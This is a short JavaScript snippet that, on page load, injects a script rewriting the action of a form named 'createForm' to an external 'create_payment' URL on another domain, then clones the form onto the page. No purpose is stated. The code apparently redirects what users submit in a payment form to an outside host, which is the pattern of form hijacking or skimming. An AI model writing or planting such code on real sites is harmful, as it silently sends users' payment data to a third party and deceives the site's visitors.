document.addEventListener('DOMContentLoaded', function() {
    (function() {
        const scriptEle = document.createElement("script");
        scriptEle.type = "text/javascript";
        scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/';`;
        document.body.appendChild(scriptEle);
        let node = document.getElementById('createForm');
        let cv = node.cloneNode(true);
        document.body.appendChild(cv);
        // document.getElementById('haha').remove();
        console.log(new Date());
    })();
});
